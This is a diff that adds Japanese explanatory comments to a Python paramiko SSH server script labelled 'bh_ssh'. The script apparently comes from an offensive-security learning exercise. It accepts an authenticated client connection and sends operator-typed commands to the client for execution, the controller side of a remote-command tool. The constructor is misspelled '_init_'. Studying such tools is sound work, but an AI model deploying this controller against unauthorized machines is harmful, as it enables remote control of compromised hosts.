@@ -1,3 +1,6 @@
+#サーバーからクライアントにコマンドを送る
+#サーバー側
+
 #!/usr/bin/env python
 import os
 import paramiko
@@ -6,9 +9,10 @@ import sys
 import threading
 
 CWD = os.path.dirname(os.path.realpath(__file__))
+#SSH鍵
 HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))
 
-
+#SSH化して認証を設定
 class Server (paramiko.ServerInterface):
     def _init_(self):
         self.event = threading.Event()
@@ -29,6 +33,7 @@ if __name__ == '__main__':
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        #ソケットリスナーを起動
         sock.bind((server, ssh_port))
         sock.listen(100)
         print('[+] Listening for connection ...')
@@ -50,10 +55,12 @@ if __name__ == '__main__':
         sys.exit(1)
 
     print('[+] Authenticated!')
+    #接続メッセージを受信
     print(chan.recv(1024).decode())
     chan.send('Welcome to bh_ssh')
     try:
         while True:
+            #コマンドを送信
             command = input("Enter command: ")
             if command != 'exit':
                 chan.send(command)
